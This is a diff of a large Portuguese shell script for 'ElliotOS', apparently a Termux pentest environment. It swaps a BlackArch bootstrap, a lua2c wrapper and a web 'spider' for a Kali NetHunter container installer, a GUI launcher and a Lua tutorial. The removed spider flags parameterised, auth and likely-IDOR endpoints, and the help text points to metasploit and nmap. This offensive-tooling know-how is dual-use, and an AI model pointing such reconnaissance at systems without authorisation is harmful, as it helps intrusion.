-      # Bootstrap via proot-distro (mais simples, sem montar manualmente)
-      proot-distro login archlinux -- bash -c "\$_STRAP" || \
-        { printf "\033[1;31m  ✗ Bootstrap falhou dentro do proot-distro\033[0m\n"; exit 1; }
-    else
-      # Bootstrap via proot direto
-      printf "\$_STRAP" > "\$_BA_ROOTFS/root/blackarch-strap.sh"
-      chmod +x "\$_BA_ROOTFS/root/blackarch-strap.sh" 2>/dev/null || true
-      unset LD_PRELOAD
-      if ! proot --link2symlink -0 -r "\$_BA_ROOTFS" -b /dev -b /proc -b /sys -b /sdcard -w /root \
-        /usr/bin/env -i HOME=/root TERM="\${TERM:-xterm-256color}" LANG=C.UTF-8 \
-        PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
-        /bin/bash /root/blackarch-strap.sh; then
-        printf "\033[1;33m  ! Tentando de novo com PROOT_NO_SECCOMP=1...\033[0m\n"
-        PROOT_NO_SECCOMP=1 proot --link2symlink -0 -r "\$_BA_ROOTFS" -b /dev -b /proc -b /sys -b /sdcard -w /root \
-          /usr/bin/env -i HOME=/root TERM="\${TERM:-xterm-256color}" LANG=C.UTF-8 \
-          PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
-          /bin/bash /root/blackarch-strap.sh || \
-          { printf "\033[1;31m  ✗ Bootstrap do BlackArch falhou\033[0m\n"; exit 1; }
-      fi
-    fi
+cat > /etc/locale.conf <<'EOF'
+LANG=pt_BR.UTF-8
+LANGUAGE=pt_BR:pt:en_US:en
+LC_ALL=pt_BR.UTF-8
+EOF
 
-    # Cria launcher (suporta proot-distro ou proot direto)
-    mkdir -p "\$_PREFIX/bin"
-    if [ "\$_BA_USE_PD" = "1" ]; then
-      # Instalado via proot-distro: usa proot-distro login
-      {
-        printf '#!/data/data/com.termux/files/usr/bin/bash\n'
-        printf '# ElliotOS BlackArch launcher (proot-distro)\n'
-        printf 'exec proot-distro login archlinux "\$@"\n'
-      } > "\$_PREFIX/bin/blackarch"
-    else
-      # Instalado via Python/rootfs manual: usa proot direto
-      {
-        printf '#!/data/data/com.termux/files/usr/bin/bash\n'
-        printf '# ElliotOS BlackArch launcher\n'
-        printf 'BA_ROOTFS="\${HOME}/.xpm/blackarch/rootfs"\n'
-        printf '[ ! -d "\$BA_ROOTFS" ] && { echo "BlackArch nao instalado. Execute: ms -ba"; exit 1; }\n'
-        printf 'unset LD_PRELOAD\n'
-        printf '_BINDS="-b /dev -b /proc -b /sys"\n'
-        printf '[ -d /sdcard ] && _BINDS="\$_BINDS -b /sdcard"\n'
-        printf '[ -d /data   ] && _BINDS="\$_BINDS -b /data"\n'
-        printf 'if [ -z "\${PROOT_NO_SECCOMP:-}" ] && ! proot --link2symlink -0 -r "\$BA_ROOTFS" -b /dev true 2>/dev/null; then export PROOT_NO_SECCOMP=1; fi\n'
-        printf 'exec proot --link2symlink -0 -r "\$BA_ROOTFS" \$_BINDS -b "\${HOME}:/root" -w /root /usr/bin/env -i HOME=/root TERM="\${TERM:-xterm-256color}" LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /bin/bash --login "\$@"\n'
-      } > "\$_PREFIX/bin/blackarch"
-    fi
-    chmod +x "\$_PREFIX/bin/blackarch"
-    ln -sf "\$_PREFIX/bin/blackarch" "\$_PREFIX/bin/ba" 2>/dev/null || \
-      { cp "\$_PREFIX/bin/blackarch" "\$_PREFIX/bin/ba"; chmod +x "\$_PREFIX/bin/ba"; }
-    printf "  \033[1;32m✓\033[0m Launcher criado: blackarch / ba\n"
+export LANG="pt_BR.UTF-8"
+ok "Locale pt-BR configurado."
 
-    printf "\n\033[1;37m╔══════════════════════════════════════════════════════╗\033[0m\n"
-    printf "\033[1;37m║  Arch Linux + BlackArch instalado com sucesso! ✓     ║\033[0m\n"
-    printf "\033[1;37m╚══════════════════════════════════════════════════════╝\033[0m\n\n"
-    printf "  Use: \033[1;36mblackarch\033[0m  ou  \033[1;36mba\033[0m\n"
-    printf "  Dentro do BlackArch: \033[0;90mpacman -S --needed blackarch-officials\033[0m  (metapacote com as ferramentas mais usadas)\n"
-    printf "  Arch: \$_BA_ARCH\n\n"
+printf "\n"
+info "Atualizando Kali Linux..."
+apt-get update -qq
+apt-get upgrade -y -qq
+ok "Kali Linux atualizado."
+
+printf "\n"
+info "Instalando dependencias basicas..."
+apt-get install -y -qq curl wget git 2>/dev/null || true
+ok "Pronto."
+
+printf "\n"
+printf "  \033[1;32m+------------------------------------------+\033[0m\n"
+printf "  \033[1;32m|              TUDO PRONTO                 |\033[0m\n"
+printf "  \033[1;32m+------------------------------------------+\033[0m\n"
+printf "\n"
+
+if [ -f /etc/os-release ]; then
+    . /etc/os-release
+    printf "  Sistema    : \033[1;31m\${PRETTY_NAME:-Kali Linux}\033[0m\n"
+fi
+printf "  Arquitetura: \033[1;36m\$(uname -m)\033[0m\n"
+printf "  Locale     : \033[1;36m\${LANG:-pt_BR.UTF-8}\033[0m\n"
+printf "\n"
+printf "  \033[1;36mExemplos:\033[0m\n"
+printf "  \033[1;36m  apt install nmap\033[0m\n"
+printf "  \033[1;36m  msfconsole\033[0m\n"
+printf "  \033[1;36m  apt search kali-linux\033[0m\n"
+printf "\n"
+
+KALI_SCRIPT
+
+    ok "Container configurado."
+    printf "\n"
+
+    info "Criando launcher 'nh'..."
+
+    cat > "\$LAUNCHER" <<'LAUNCHER_SCRIPT'
+#!/data/data/com.termux/files/usr/bin/bash
+CONTAINER="kali"
+trap 'pkill -f "termux-x11" 2>/dev/null; exit 0' INT TERM
+
+case "\${1:-}" in
+  -h|--help)
+    printf "\033[1;31mnh\033[0m -- Kali Linux NetHunter (ElliotOS)\n\n"
+    printf "  \033[1;36mUso:\033[0m\n"
+    printf "    nh              Entra no terminal do Kali Linux\n"
+    printf "    nh --gui | -g   Inicia XFCE via Termux X11\n"
+    printf "    nh --help | -h  Mostra esta ajuda\n"
+    printf "\n"
+    printf "  \033[1;36mExemplos dentro do container:\033[0m\n"
+    printf "    apt install nmap              Instala nmap\n"
+    printf "    apt install metasploit-framework  Instala metasploit\n"
+    printf "    apt search kali-tools         Busca ferramentas Kali\n"
+    printf "    apt update && apt upgrade     Atualiza o sistema\n"
+    printf "\n"
+    printf "  \033[1;90mIsolado do Termux -- sem acesso ao home do host\033[0m\n"
+    exit 0
+    ;;
+esac
+
+if ! command -v proot-distro >/dev/null 2>&1; then
+    echo "[!] PRoot-Distro nao esta instalado."
+    exit 1
+fi
+if ! proot-distro list --quiet 2>/dev/null | grep -Fxq "\$CONTAINER"; then
+    echo "[!] O container '\$CONTAINER' nao existe."
+    echo "Execute novamente: ms -nh"
+    exit 1
+fi
+# Modo GUI: instala XFCE e roda via Termux X11
+if [ "\${1:-}" = "--gui" ] || [ "\${1:-}" = "-g" ]; then
+    if ! command -v termux-x11 >/dev/null 2>&1 && [ ! -f "/data/data/com.termux.x11/files/usr/bin/termux-x11" ]; then
+        echo "[!] Termux X11 nao encontrado."
+        echo "    Instale o app Termux:X11 e rode:"
+        echo "    pkg install termux-x11-nightly"
+        exit 1
+    fi
+    # Instala XFCE do Kali e configura panel
+    proot-distro login --bind /data/data/com.termux:/data/data/com.termux "\$CONTAINER" -- bash -c \
+        "dpkg -l kali-desktop-xfce 2>/dev/null | grep -q '^\.\?ii' || (apt-get update -qq && apt-get install -y -qq kali-desktop-xfce kali-themes kali-menu kali-wallpapers-all xfdesktop4 dbus-x11 x11-xserver-utils 2>/dev/null || true); \
+         mkdir -p /root/.config/xfce4/xfconf/xfce-perchannel-xml; \
+         cp -f /usr/share/kali-themes/etc/xdg/xfce4/panel/default.xml /root/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-panel.xml 2>/dev/null || true"
+    # Limpeza: mata processo anterior e remove sockets/locks stale
+    _X11_SOCK="\${TMPDIR}/.X11-unix/X1"
+    _X11_LOCK="\${TMPDIR}/.X1-lock"
+    pkill -f "termux-x11" 2>/dev/null || true; sleep 1
+    rm -f "\$_X11_SOCK" "\$_X11_LOCK" 2>/dev/null || true
+    rmdir "\${TMPDIR}/.X11-unix" 2>/dev/null || true
+    mkdir -p "\${TMPDIR}/.X11-unix"
+    # Inicia Termux:X11 no display :1
+    export XDG_RUNTIME_DIR="\${TMPDIR}"
+    pulseaudio --start --load="module-native-protocol-tcp auth-ip-acl=127.0.0.1 auth-anonymous=1" --exit-idle-time=-1 2>/dev/null || true
+    termux-x11 :1 &
+    am start --user 0 -n com.termux.x11/com.termux.x11.MainActivity >/dev/null 2>&1
+    _WAIT=0
+    until [ -S "\$_X11_SOCK" ]; do
+        sleep 1; _WAIT=\$((_WAIT+1))
+        [ "\$_WAIT" -ge 15 ] && { echo "[!] Timeout — abra o app Termux:X11 e tente novamente."; exit 1; }
+    done
+    # Entra no container com --shared-tmp e --env para injetar DISPLAY garantido
+    proot-distro login \
+        --bind /data/data/com.termux:/data/data/com.termux \
+        --shared-tmp \
+        --env DISPLAY=:1 \
+        --env PULSE_SERVER=127.0.0.1 \
+        --env GALLIUM_DRIVER=llvmpipe \
+        --env LIBGL_ALWAYS_SOFTWARE=1 \
+        --env MESA_GL_VERSION_OVERRIDE=3.3 \
+        --env MESA_GLSL_VERSION_OVERRIDE=330 \
+        --env EGL_LOG_LEVEL=fatal \
+        --env GTK_THEME=Adwaita:dark \
+        "\$CONTAINER" -- /bin/bash -c \
+        "mkdir -p /tmp/runtime-nh && chmod 700 /tmp/runtime-nh; \
+         export XDG_RUNTIME_DIR=/tmp/runtime-nh; \
+         rm -f /tmp/dbus-nh.sock; \
+         dbus-daemon --session --address=unix:path=/tmp/dbus-nh.sock --fork 2>/dev/null || true; \
+         export DBUS_SESSION_BUS_ADDRESS=unix:path=/tmp/dbus-nh.sock; \
+         xfsettingsd --no-daemon & sleep 2; \
+         mkdir -p /usr/share/images/desktop-base; \
+         find /usr/share/backgrounds/kali -name \"*.png\" 2>/dev/null | sort | xargs -I{} cp -f {} /usr/share/images/desktop-base/ 2>/dev/null || true; \
+         _WPS=\$(find /usr/share/images/desktop-base -name \"*.png\" | sort | head -1); \
+         [ -n \"\$_WPS\" ] && cp -f \"\$_WPS\" /usr/share/images/desktop-base/default 2>/dev/null || true; \
+         cp /etc/xdg/menus/applications-merged/kali-applications.menu /etc/xdg/menus/xfce-applications.menu 2>/dev/null || true; \
+         xfdesktop & sleep 2; \
+         xfce4-panel & exec xfwm4 --display :1"
+fi
+proot-distro login --bind /data/data/com.termux:/data/data/com.termux "\$CONTAINER"
+LAUNCHER_SCRIPT
+
+    chmod 755 "\$LAUNCHER"
+    ln -sf "\$LAUNCHER" "\$PREFIX/bin/nethunter" 2>/dev/null || true
+    ok "Launcher 'nh' criado em \$LAUNCHER"
+    printf "\n"
+
+    printf "  \033[1;32m+------------------------------------------+\033[0m\n"
+    printf "  \033[1;32m|          INSTALACAO CONCLUIDA            |\033[0m\n"
+    printf "  \033[1;32m|  Use: nh  ou  pd login kali             |\033[0m\n"
+    printf "  \033[1;32m+------------------------------------------+\033[0m\n"
+    printf "\n"
     ;;
 
-  # ── Spider ──────────────────────────────────────────────────
-  -s|--spider)
-    shift
-    exec "\$_B" -e "
-local t=mod.spider('\$1',tonumber('\$2') or nil)
-if type(t)~='table' then print('[erro] spider falhou') return end
-local filter_endpoints=('\$3'~='')
-if filter_endpoints then
-  -- modo filtrado: só retorna páginas com endpoints (params + inputs + idor)
-  local eps={}
-  for _,v in ipairs(t.params  or {}) do eps[#eps+1]=v end
-  for _,v in ipairs(t.inputs  or {}) do eps[#eps+1]=v end
-  for _,v in ipairs(t.idor    or {}) do eps[#eps+1]=v end
-  for _,v in ipairs(t.auth    or {}) do eps[#eps+1]=v end
-  for _,v in ipairs(t.redirect or {}) do eps[#eps+1]=v end
-  print('[spider] '..#eps..' endpoint(s) com parâmetros encontrados')
-  for _,v in ipairs(eps) do print(v) end
-else
-  -- modo padrão: todas as páginas
-  local all=t.all or {}
-  print('[spider] '..#all..' URLs coletadas')
-  for _,v in ipairs(all) do print(v) end
-  if t.counts then
-    local c=t.counts
-    if(c.params or 0)>0 then print('\n[params] '..c.params..' com parâmetros') end
-    if(c.inputs or 0)>0 then print('[inputs] '..c.inputs..' form endpoints') end
-    if(c.idor   or 0)>0 then print('[idor]   '..c.idor..' prováveis IDOR') end
-    if(c.auth   or 0)>0 then print('[auth]   '..c.auth..' endpoints de auth') end
-  end
-end"
+  # ── Arch Linux ARM Installer (termux-arch) ───────────────────────────────
+  -ba|--blackarch)
+    _ARCH_SCRIPT="\${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts/install-arch.sh"
+    if [ -f "\$_ARCH_SCRIPT" ]; then
+      bash "\$_ARCH_SCRIPT"
+    else
+      printf "\033[1;31m[✗]\033[0m install-arch.sh não encontrado em \$_ARCH_SCRIPT\n"
+      printf "    Reinstale o ElliotOS: bash luascript.sh\n"
+      exit 1
+    fi
     ;;
 
   "")
     exec "\$_B"
     ;;
 
-  # ── lua2c wrapper ────────────────────────────────────────────────────────
-  --lua2c|-lua2c|-2c)
-    shift
-    _L2C_RUN=0
-    _L2C_OUT=""
-
-    while true; do
-      case "\$1" in
-        -r|--run)  _L2C_RUN=1; shift ;;
-        -o|--out)  _L2C_OUT="\$2"; shift 2 ;;
-        *) break ;;
-      esac
-    done
-
-    if [ -z "\$1" ]; then
-      printf "\033[1;31m  [✗]\033[0m Uso: ms -lua2c [-r] [-o saida.c] <arquivo.lua | 'codigo'>\n"
-      printf "\033[0;90m       -r : transpila e compila com cxx\033[0m\n"
-      printf "\033[0;90m       -o : nome do .c gerado (padrão: <nome>.c)\033[0m\n"
-      exit 1
-    fi
-
-    _L2C_INPUT="\$1"
-
-    # ── usa TMPDIR do Termux (nunca /tmp) ───────────────────────────────
-    _L2C_TMPDIR="\${TMPDIR:-\${PREFIX}/tmp}"
-
-    if [ -f "\$_L2C_INPUT" ]; then
-      # é arquivo .lua — copia para tmp para evitar problema de path com espaços
-      _L2C_BASE=\$(basename "\$_L2C_INPUT" .lua)
-      [ -z "\$_L2C_OUT" ] && _L2C_OUT="\${_L2C_BASE}.c"
-      _L2C_SRC="\$_L2C_INPUT"
-    else
-      # código inline — salva em tmp
-      _L2C_BASE="out"
-      [ -z "\$_L2C_OUT" ] && _L2C_OUT="out.c"
-      _L2C_SRC="\${_L2C_TMPDIR}/lua2c_src_\$\$.lua"
-      printf '%s\n' "\$_L2C_INPUT" > "\$_L2C_SRC"
-    fi
-
-    printf "\033[1;35m┌──────────────────────────────────────┐\033[0m\n"
-    printf "\033[1;35m│\033[0m \033[1;36m⚙  lua2c\033[0m → \033[1;33m%s\033[0m\n" "\$_L2C_OUT"
-    printf "\033[1;35m└──────────────────────────────────────┘\033[0m\n"
-
-    # ── script Lua passado via arquivo temporário ─────────────────────
-    # Não usa -e com strings longas — evita problema de quoting/expansão
-    _L2C_RUNNER="\${_L2C_TMPDIR}/lua2c_run_\$\$.lua"
-    cat > "\$_L2C_RUNNER" << LUAEOF
-local src  = arg[1]
-local dest = arg[2]
-local f = io.open(src, 'r')
-if not f then
-  io.write('\027[1;31m[✗] Não foi possível abrir: ' .. src .. '\027[0m\n')
-  os.exit(1)
-end
-local code = f:read('*a')
-f:close()
-local c, err = cc.lua2c(code)
-if not c then
-  io.write('\027[1;31m[✗] Erro lua2c: ' .. tostring(err) .. '\027[0m\n')
-  os.exit(1)
-end
-local out = io.open(dest, 'w')
-if not out then
-  io.write('\027[1;31m[✗] Não foi possível criar: ' .. dest .. '\027[0m\n')
-  os.exit(1)
-end
-out:write(c)
-out:close()
-io.write('\027[1;32m[✓] Gerado: ' .. dest .. '\027[0m\n')
-LUAEOF
-
-    "\$_B" "\$_L2C_RUNNER" "\$_L2C_SRC" "\$_L2C_OUT"
-    _L2C_EXIT=\$?
-
-    rm -f "\$_L2C_RUNNER"
-    [ -f "\${_L2C_TMPDIR}/lua2c_src_\$\$.lua" ] && rm -f "\${_L2C_TMPDIR}/lua2c_src_\$\$.lua"
-
-    [ \$_L2C_EXIT -ne 0 ] && exit \$_L2C_EXIT
-
-    if [ "\$_L2C_RUN" = "1" ]; then
-      printf "\033[1;36m[→] Compilando com cxx...\033[0m\n"
-      command -v cxx >/dev/null 2>&1 && cxx "\$_L2C_OUT" || {
-        printf "\033[1;31m[✗] cxx não encontrado. Use: cxx %s\033[0m\n" "\$_L2C_OUT"
-        exit 1
-      }
-    fi
-    ;;
-
   *)
-    # Flag desconhecida ou arquivo .lua / script com shebang
     case "\$1" in
       -*)
-        printf "\033[1;31m  [✗]\033[0m \033[1;37mOpção desconhecida:\033[0m \033[1;33m%s\033[0m\n" "\$1"
-        printf "\033[0;90m      Use \033[1;32mms -h\033[0;90m para ver os comandos disponíveis.\033[0m\n"
+        printf "\033[1;31m  [\xe2\x9c\x97]\033[0m Op\xc3\xa7\xc3\xa3o desconhecida: %s\n" "\$1"
         exit 1
         ;;
       *)
-        # Suporte a shebang: ./script.lua, ms script.lua, ms script.lua -- args
-        # O kernel passa o arquivo como $1 quando o shebang aponta pra ms.
         _SCRIPT="\$1"; shift
-        # Consome "--" separador opcional (ms script.lua -- --flag)
         [ "\${1:-}" = "--" ] && shift
-        # Pré-processamento automático de variáveis indexadas (!N) se detectado
         if [ -f "\$_SCRIPT" ] && _ivar_needs_preprocess "\$_SCRIPT"; then
             _ivar_run_file "\$_SCRIPT" "\$@"
         else
@@ -102497,543 +104681,1624 @@ XTUNSRCEOF
     # ── learn.lua — tutorial interativo completo ──────────────────────────
     cat > "$_EX_DIR/learn.lua" << 'LEARNEOF'
 -- ╔══════════════════════════════════════════════════════════════╗
--- ║  ElliotOS — Tutorial Interativo                             ║
--- ║  Use: ms -f learn.lua                                       ║
+-- ║  ElliotOS — Tutorial Completo (30 Lições)                  ║
+-- ║  Trilha 1: Lua básico ao avançado    (lições  1-12)        ║
+-- ║  Trilha 2: Lua + ElliotOS API        (lições 13-21)        ║
+-- ║  Trilha 3: C no ElliotOS             (lições 22-27)        ║
+-- ║  Trilha 4: Projetos reais            (lições 28-30)        ║
 -- ╚══════════════════════════════════════════════════════════════╝
 
 local C = {
-    titulo  = '\027[1;35m',
-    ok      = '\027[1;32m',
-    info    = '\027[1;36m',
-    cmd     = '\027[1;33m',
-    dim     = '\027[0;90m',
-    err     = '\027[1;31m',
-    reset   = '\027[0m',
-    bold    = '\027[1m',
+    titulo = '\027[1;35m', ok    = '\027[1;32m',
+    info   = '\027[1;36m', cmd   = '\027[1;33m',
+    dim    = '\027[0;90m', err   = '\027[1;31m',
+    bold   = '\027[1m',    reset = '\027[0m',
+    tri    = '\027[1;34m',
 }
 
-local function titulo(txt)
-    print(C.titulo.."\n╔══════════════════════════════════════════════════╗")
-    print("║  "..txt..string.rep(" ", 49-#txt).."║")
-    print("╚══════════════════════════════════════════════════╝"..C.reset)
+local TOTAL = 30
+local licao_atual = 0
+
+local function limpar() io.write('\027[2J\027[H') end
+
+local function cabecalho(n, titulo_licao)
+    limpar()
+    licao_atual = n
+    print(C.titulo..'╔══════════════════════════════════════════════════════════════════╗')
+    print(string.format('║  ElliotOS — Tutorial  [Lição %d/%d]%-28s║', n, TOTAL, ''))
+    print(string.format('║  %-66s║', titulo_licao))
+    print('╚═════════════════════════════════════════════════════════════════╝'..C.reset)
+    print()
 end
 
-local function secao(txt)
-    print(C.info.."\n── "..txt.." "..string.rep("─", 45-#txt)..C.reset)
+local function sec(txt)
+    print(C.info..'  ── '..txt..' ──'..C.reset..'\n')
 end
 
-local function ex(desc, code)
-    print(C.dim.."-- "..desc..C.reset)
-    print(C.cmd..code..C.reset)
+local function ok(txt)
+    print(C.dim..'  '..txt..C.reset)
 end
 
-local function ok(txt) print(C.ok.."✓ "..txt..C.reset) end
-local function info(txt) print(C.info.."→ "..txt..C.reset) end
-
-local function pausar()
-    io.write(C.dim.."\n  [Enter para continuar, 's' para pular seção] "..C.reset)
-    local r = io.read("*l")
-    return r == "s"
+local function cont()
+    io.write(C.dim..'\n  [ENTER para continuar, s=pular, q=sair] '..C.reset)
+    local r = io.read('*l') or 'q'
+    if r == 'q' then os.exit(0) end
+    return r == 's'
 end
 
-local function menu()
-    titulo("ElliotOS — Tutorial Interativo em Português")
-    print(C.dim.."  Aprenda Lua + ElliotOS do zero ao pentest\n"..C.reset)
+local function menu_trilhas()
+    limpar()
+    print(C.titulo..'  ╔══════════════════════════════════════════════════════════╗')
+    print('  ║        ElliotOS — Tutorial Completo                    ║')
+    print('  ╚══════════════════════════════════════════════════════════╝'..C.reset..'\n')
+    print(C.tri..'  Trilha 1:'..C.ok..' Lua — do zero ao avançado      '..C.dim..'(lições  1-12)'..C.reset)
+    print(C.tri..'  Trilha 2:'..C.ok..' Lua + ElliotOS API             '..C.dim..'(lições 13-21)'..C.reset)
+    print(C.tri..'  Trilha 3:'..C.ok..' C no ElliotOS                  '..C.dim..'(lições 22-27)'..C.reset)
+    print(C.tri..'  Trilha 4:'..C.ok..' Projetos reais de pentest      '..C.dim..'(lições 28-30)'..C.reset)
+    print()
+    print(C.dim..'  Opções:'..C.reset)
+    print('    '..C.cmd..'1'..C.reset..' — Começar do início (lição 1)')
+    print('    '..C.cmd..'2'..C.reset..' — Trilha 2: ElliotOS API (lição 13)')
+    print('    '..C.cmd..'3'..C.reset..' — Trilha 3: C (lição 22)')
+    print('    '..C.cmd..'4'..C.reset..' — Trilha 4: Projetos (lição 28)')
+    print('    '..C.cmd..'N'..C.reset..' — Ir para lição N (ex: 7)')
+    print('    '..C.cmd..'0'..C.reset..' — Sair')
+    io.write('\n  '..C.bold..'Escolha: '..C.reset)
+    local r = io.read('*l') or '0'
+    if r == '0' then os.exit(0) end
+    if r == '1' then return 1 end
+    if r == '2' then return 13 end
+    if r == '3' then return 22 end
+    if r == '4' then return 28 end
+    local n = tonumber(r)
+    if n and n >= 1 and n <= TOTAL then return n end
+    return 1
+end
 
-    local secoes = {
-        "1. Lua Básico — variáveis, funções, loops",
-        "2. Módulo net — HTTP, TCP, UDP, DNS",
-        "3. Módulo sys — threads e tempo",
-        "4. Módulo fs  — arquivos e diretórios",
-        "5. Módulo mod — scanners de pentest",
-        "6. Módulo crypto — hash e encoding",
-        "7. Módulo db  — banco de dados SQLite",
-        "8. Scripts completos de exemplo",
-        "0. Sair",
-    }
-    for _, s in ipairs(secoes) do
-        print("  "..C.cmd..s..C.reset)
+-- ══════════════════════════════════════════════════
+-- TRILHA 1 — LUA DO ZERO AO AVANÇADO
+-- ══════════════════════════════════════════════════
+
+local function l01()
+    cabecalho(1, 'TRILHA 1 — Lua: O que é e por que usar')
+    sec('O que é Lua')
+    ok('Lua é uma linguagem leve, rápida e embarcável criada no Brasil (PUC-Rio).')
+    ok('É a linguagem de scripts do ElliotOS — todos os módulos de pentest')
+    ok('são acessíveis via Lua. O interpretador é o próprio ms.')
+    print()
+    sec('Como rodar Lua no ElliotOS')
+    ok('ms                      # REPL interativo — digite Lua direto')
+    ok("ms -c 'print(\"olá\")'   # executa uma linha")
+    ok('ms -f meu_script.lua    # executa um arquivo')
+    print()
+    sec('Primeiro programa')
+    ok('-- salve como ola.lua')
+    ok("print('Olá, ElliotOS!')")
+    ok("print(1 + 1)           --> 2")
+    ok("print(type('texto'))   --> string")
+    cont()
+end
+
+local function l02()
+    cabecalho(2, 'TRILHA 1 — Variáveis e Tipos')
+    sec('Tipos básicos de Lua')
+    ok('nil        -- ausência de valor')
+    ok('boolean    -- true / false')
+    ok('number     -- inteiros e decimais (64-bit)')
+    ok('string     -- texto')
+    ok('table      -- arrays, dicionários, objetos')
+    ok('function   -- funções são valores de primeira classe')
+    print()
+    sec('Variáveis')
+    ok("local x = 10            -- local ao bloco (recomendado)")
+    ok("y = 20                  -- global (evite)")
+    ok("local nome = 'Elliot'")
+    ok("local ativo = true")
+    ok("local nada = nil")
+    print()
+    sec('Strings')
+    ok("local s = 'ola mundo'")
+    ok('local t = "também funciona"')
+    ok('local multi = [[ texto')
+    ok('em várias linhas ]]')
+    ok("print(#s)               -- comprimento: 9")
+    ok("print(s .. '!')         -- concatenação: 'ola mundo!'")
+    ok("print(s:upper())        -- 'OLA MUNDO'")
+    ok("print(s:sub(1,3))       -- 'ola'")
+    cont()
+end
+
+local function l03()
+    cabecalho(3, 'TRILHA 1 — Operadores e Lógica')
+    sec('Operadores aritméticos')
+    ok('print(10 + 3)    --> 13')
+    ok('print(10 - 3)    --> 7')
+    ok('print(10 * 3)    --> 30')
+    ok('print(10 / 3)    --> 3.3333...')
+    ok('print(10 // 3)   --> 3   (divisão inteira)')
+    ok('print(10 % 3)    --> 1   (resto)')
+    ok('print(2 ^ 8)     --> 256 (potência)')
+    print()
+    sec('Operadores relacionais')
+    ok('==  ~=  <  >  <=  >=')
+    ok('print(1 == 1)    --> true')
+    ok('print(1 ~= 2)    --> true   (diferente)')
+    print()
+    sec('Operadores lógicos')
+    ok('and   or   not')
+    ok('print(true and false)   --> false')
+    ok('print(true or false)    --> true')
+    ok('print(not true)         --> false')
+    print()
+    ok('-- truque útil: valor padrão')
+    ok('local x = nil')
+    ok("local v = x or 'padrão'   --> 'padrão'")
+    cont()
+end
+
+local function l04()
+    cabecalho(4, 'TRILHA 1 — if, elseif, else')
+    sec('Estrutura condicional')
+    ok('local nota = 75')
+    ok('')
+    ok("if nota >= 90 then")
+    ok("  print('A')")
+    ok("elseif nota >= 70 then")
+    ok("  print('B')          -- cai aqui")
+    ok("elseif nota >= 50 then")
+    ok("  print('C')")
+    ok("else")
+    ok("  print('Reprovado')")
+    ok("end")
+    print()
+    sec('Condicional em uma linha (ternário via and/or)')
+    ok("local status = (nota >= 70) and 'aprovado' or 'reprovado'")
+    ok("print(status)    --> 'aprovado'")
+    print()
+    sec('Nil e false são falsos — tudo o mais é verdadeiro')
+    ok("if 0 then print('0 é true em Lua!') end    -- imprime!")
+    ok("if '' then print('string vazia é true') end -- imprime!")
+    cont()
+end
+
+local function l05()
+    cabecalho(5, 'TRILHA 1 — Loops: while, repeat, for')
+    sec('while')
+    ok('local i = 1')
+    ok('while i <= 5 do')
+    ok('  print(i)')
+    ok('  i = i + 1')
+    ok('end')
+    print()
+    sec('repeat...until (executa ao menos uma vez)')
+    ok('local x = 0')
+    ok('repeat')
+    ok('  x = x + 1')
+    ok('until x >= 3')
+    ok('print(x)   --> 3')
+    print()
+    sec('for numérico')
+    ok('for i = 1, 5 do print(i) end          -- 1 a 5')
+    ok('for i = 10, 1, -2 do print(i) end     -- 10 8 6 4 2')
+    print()
+    sec('break')
+    ok('for i = 1, 100 do')
+    ok('  if i == 5 then break end')
+    ok('  print(i)')
+    ok('end')
+    cont()
+end
+
+local function l06()
+    cabecalho(6, 'TRILHA 1 — Funções')
+    sec('Definindo funções')
+    ok('local function soma(a, b)')
+    ok('  return a + b')
+    ok('end')
+    ok('print(soma(3, 4))   --> 7')
+    print()
+    sec('Múltiplos retornos')
+    ok('local function minmax(t)')
+    ok('  local mn, mx = t[1], t[1]')
+    ok('  for _, v in ipairs(t) do')
+    ok('    if v < mn then mn = v end')
+    ok('    if v > mx then mx = v end')
+    ok('  end')
+    ok('  return mn, mx')
+    ok('end')
+    ok('local a, b = minmax({3,1,7,2})')
+    ok('print(a, b)   --> 1  7')
+    print()
+    sec('Funções como valores (closures)')
+    ok('local function contador(inicio)')
+    ok('  local n = inicio')
+    ok('  return function()')
+    ok('    n = n + 1')
+    ok('    return n')
+    ok('  end')
+    ok('end')
+    ok('local c = contador(0)')
+    ok('print(c(), c(), c())   --> 1  2  3')
+    cont()
+end
+
+local function l07()
+    cabecalho(7, 'TRILHA 1 — Tables: arrays e dicionários')
+    sec('Array (índice começa em 1)')
+    ok("local frutas = {'maçã', 'banana', 'uva'}")
+    ok("print(frutas[1])        --> maçã")
+    ok("print(#frutas)          --> 3")
+    ok("table.insert(frutas, 'kiwi')")
+    ok("table.remove(frutas, 1)")
+    print()
+    sec('Dicionário (chave-valor)')
+    ok("local alvo = {")
+    ok("  host = '192.168.1.1',")
+    ok("  porta = 80,")
+    ok("  aberto = true")
+    ok("}")
+    ok("print(alvo.host)        --> 192.168.1.1")
+    ok("print(alvo['porta'])    --> 80")
+    ok("alvo.ssl = false        -- adiciona campo")
+    print()
+    sec('Iteração')
+    ok('-- array:')
+    ok('for i, v in ipairs(frutas) do print(i, v) end')
+    ok('')
+    ok('-- dicionário:')
+    ok('for k, v in pairs(alvo) do print(k, v) end')
+    cont()
+end
+
+local function l08()
+    cabecalho(8, 'TRILHA 1 — Strings avançado')
+    sec('Funções da biblioteca string')
+    ok("local url = 'http://alvo.com/login?id=1'")
+    ok("")
+    ok("url:find('login')          -- posição: 19 23")
+    ok("url:match('(%w+)%.com')    -- captura: 'alvo'")
+    ok("url:gsub('http', 'https')  -- substitui")
+    ok("url:len()                  -- comprimento")
+    ok("url:rep(2, ', ')           -- repete")
+    ok("('  ola  '):match('^%s*(.-)%s*$')  -- trim")
+    print()
+    sec('string.format (como printf)')
+    ok("string.format('%s:%d', 'host', 80)  --> 'host:80'")
+    ok("string.format('%.2f', 3.14159)      --> '3.14'")
+    ok("string.format('%05d', 42)           --> '00042'")
+    print()
+    sec('Padrões Lua (tipo regex simplificado)')
+    ok('%d   dígito      %a  letra      %s  espaço')
+    ok('%w   alfanum     %p  pontuação  %l  minúscula')
+    ok('.    qualquer    *   zero+      +   um+     ?  zero/um')
+    ok('')
+    ok('-- extrair IP de texto:')
+    ok("local txt = 'host: 192.168.1.1 porta 80'")
+    ok("print(txt:match('%d+%.%d+%.%d+%.%d+'))  --> 192.168.1.1")
+    cont()
+end
+
+local function l09()
+    cabecalho(9, 'TRILHA 1 — Módulos e arquivos')
